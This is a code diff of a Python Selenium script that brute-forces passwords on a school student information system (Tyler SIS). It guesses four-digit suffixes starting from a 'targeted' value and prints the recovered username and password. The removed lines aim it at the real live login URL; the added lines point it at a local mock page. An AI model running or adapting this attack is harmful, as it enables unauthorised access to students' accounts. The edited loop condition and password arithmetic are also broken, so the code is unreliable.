@@ -23,19 +23,20 @@ numToUse = str(6700).zfill(4) #Starting point, very targeted towards correct pas
 #may need to replace the executable path with the correct destination on your computer
 browser = webdriver.Chrome(executable_path=r"chromedriver.exe")#sets the webdriver to open the browser
 
-browser.get('https://sdm.sisk12.com/RP360x3/login') #opens tyler sis in google chrome
+browser.get('file:///C:/Users/ncampbell282/Documents/GitHub/STASoftDevEEP/sis_main/sis_Web/login-page.html') #opens tyler sis in google chrome
 
 time.sleep(1.5) #this is a pause to ensure that the site loads fully
-student = browser.find_element_by_id("mat-tab-label-0-2")#finds the student tab inside the browser
-student.click()#clicks on the student tab
 
 username = browser.find_element_by_id("txtUserName") #sets focus on the username text input box
 username.send_keys(name)#inputs the username inputed earlier
 
 password = browser.find_element_by_id("txtPassword") #sets focus on the password text input box
 
+#Login message, get the element that holds the message if the login is successful
+isLogin = browser.find_element_by_id("is-login")
+
 #Brute Force Iterations
-while browser.current_url == ("https://sdm.sisk12.com/RP360x3/login"):#attempts different passwords until a login is found via change in url
+while isLogin != "Login successful":#attempts different passwords until a login is found via change in url
     password.clear()#removes any text the password box
     password.send_keys(base + str(numToUse).zfill(4)) #inputs the current password attempt
     password.send_keys(Keys.RETURN)#presses enter to submit the info to tylersis
@@ -46,6 +47,7 @@ while browser.current_url == ("https://sdm.sisk12.com/RP360x3/login"):#attempts 
 
 print("The username is: " + name)#prints the username inputed earlier
 print("The password is: " + base + (str(numToUse-1).zfill(4)))#prints the correct password for the user inputed
+
 #Close browser is unsuccessful
-if browser.current_url == ("https://sdm.sisk12.com/RP360x3/login"):
+if browser.current_url == ('file:///C:/Users/ncampbell282/Documents/GitHub/STASoftDevEEP/sis_main/sis_Web/login-page.html'):
     browser.close()
